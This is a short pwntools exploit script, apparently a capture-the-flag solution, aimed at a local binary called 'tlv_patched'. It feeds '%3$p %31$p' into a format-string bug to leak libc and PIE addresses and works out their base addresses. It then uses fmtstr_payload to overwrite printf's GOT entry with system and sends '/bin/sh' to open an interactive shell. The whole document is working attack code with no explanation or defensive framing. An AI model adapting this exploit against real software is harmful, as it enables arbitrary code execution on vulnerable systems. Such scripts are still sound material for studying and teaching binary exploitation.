#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('tlv_patched')
libc = ELF('libc.so.6')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *printf
continue
'''.format(**locals())

# -- Exploit goes here --

# str 200 AAABBB CCCC %9$x
# $3p __GI___libc_write+23
# $31$p 0x5555555554cc

io = start()

# Leak ASLR
p = b'str 200 '
p += b'%3$p %31$p'

io.sendlineafter(b'> ',p)
io.recvuntil(b'Issue logged: ')

libc_leak,pie_leak = io.recvline().split()
libc_leak,pie_leak = (int(libc_leak,16), int(pie_leak,16))
libc.address = libc_leak - (libc.sym['__GI___libc_write']+23)
exe.address = pie_leak - 0X14cc

log.success(f'{libc.address = :x} {exe.address = :x} {libc.sym["system"] = :x}')

# GOT overwrite
p = b'str 200 AAABBB '
fmt = fmtstr_payload(9, {exe.got['printf']: libc.sym["system"]}, numbwritten=8)
p += fmt

print(p, len(p))

io.sendlineafter(b'> ',p)

io.sendline(b'str 200 /bin/sh')

io.interactive()

